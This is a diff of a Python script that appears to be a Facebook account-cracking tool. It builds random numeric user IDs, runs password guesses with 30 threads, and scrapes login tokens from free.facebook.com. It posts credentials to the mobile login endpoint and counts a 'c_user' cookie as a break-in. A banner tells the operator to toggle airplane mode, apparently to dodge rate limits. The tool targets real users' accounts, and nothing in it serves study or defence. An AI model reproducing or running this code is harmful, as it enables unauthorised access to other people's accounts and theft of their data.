@@ -726,7 +726,7 @@ def NUM():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=20) as king_xd:
+  with tred(max_workers=30) as king_xd:
     os.system('clear')
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -894,8 +894,6 @@ def m1(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   lok = ('prod','alpha','beta')
-   pro = random.choice(lok)
    free_fb = session.get(f'https://free.facebook.com').text
    log_data = {
     'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -930,7 +928,7 @@ def m1(idf,pwv):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36'}
+    'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36',}
    lo = session.post(f'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
